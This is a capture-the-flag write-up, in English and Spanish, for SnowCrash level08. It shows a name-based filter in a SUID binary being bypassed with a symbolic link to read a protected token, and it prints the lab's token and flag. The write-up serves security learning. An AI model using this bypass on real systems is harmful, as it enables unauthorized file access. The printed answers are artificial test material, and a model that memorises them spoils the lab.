# Flag 08

## Tools Used:

* `ls`, `chmod`, `ln -s`
* Basic knowledge of symbolic links and file permissions
* Reverse engineering (Ghidra or equivalent)

## Process:

Upon accessing the `level08` account, listing the files reveals:

```bash
level08@SnowCrash:~$ ls -la
```

Key files:

```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

The **token** file is not readable by `level08`, but there is an SUID binary `level08` that allows reading files.

### Decompilation Analysis:

The binary reads a file (provided as an argument) and prints its contents, but explicitly blocks reading any file named `token`:

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

### Key observations:

1. The restriction is **name-based** only, not permission-based.
2. Creating a **symbolic link** bypasses the name check.

### Exploitation:

1. Change directory permissions to allow the creation of symlinks:

```bash
level08@SnowCrash:~$ chmod 777 .
```

2. Create a symbolic link with a different name pointing to `token`:

```bash
level08@SnowCrash:~$ ln -s token hola
```

3. Run the binary with the symlink as argument:

```bash
level08@SnowCrash:~$ ./level08 hola
```

Output:

```
quif5eloekouj29ke0vouxean
```

4. Switch to the `flag08` user and retrieve the actual flag:

```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

# Flag 08

## Herramientas Utilizadas:

* Comandos `ls`, `chmod`, `ln -s`
* Conocimientos básicos de enlaces simbólicos y permisos de archivos
* Ingeniería inversa (Ghidra o equivalente)

## Proceso:

Al acceder a la cuenta `level08` y listar los archivos:

```bash
level08@SnowCrash:~$ ls -la
```

Archivos clave:

```
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

El archivo **token** no puede ser leído directamente, pero el binario `level08` con permisos SUID permite leer cualquier archivo salvo que su nombre contenga "token".

### Análisis del Código:

El binario verifica el nombre del archivo y deniega el acceso si contiene la palabra "token":

```c
if (strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(1);
}
```

### Observaciones clave:

1. La verificación es únicamente sobre el **nombre** del archivo, no sobre permisos o inodos.
2. Un **enlace simbólico** con otro nombre puede eludir esta comprobación.

### Explotación:

1. Modificamos los permisos del directorio:

```bash
level08@SnowCrash:~$ chmod 777 .
```

2. Creamos un enlace simbólico apuntando a `token`:

```bash
level08@SnowCrash:~$ ln -s token hola
```

3. Ejecutamos el binario usando el enlace simbólico:

```bash
level08@SnowCrash:~$ ./level08 hola
```

Resultado:

```
quif5eloekouj29ke0vouxean
```

4. Con este token, accedemos al usuario `flag08` y obtenemos la flag real:

```bash
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

## Scripts Used:

```bash
ln -s token hola
./level08 hola
```

## Flag:

```
25749xKZ8L7DkSCwJkT9dyv6f
```
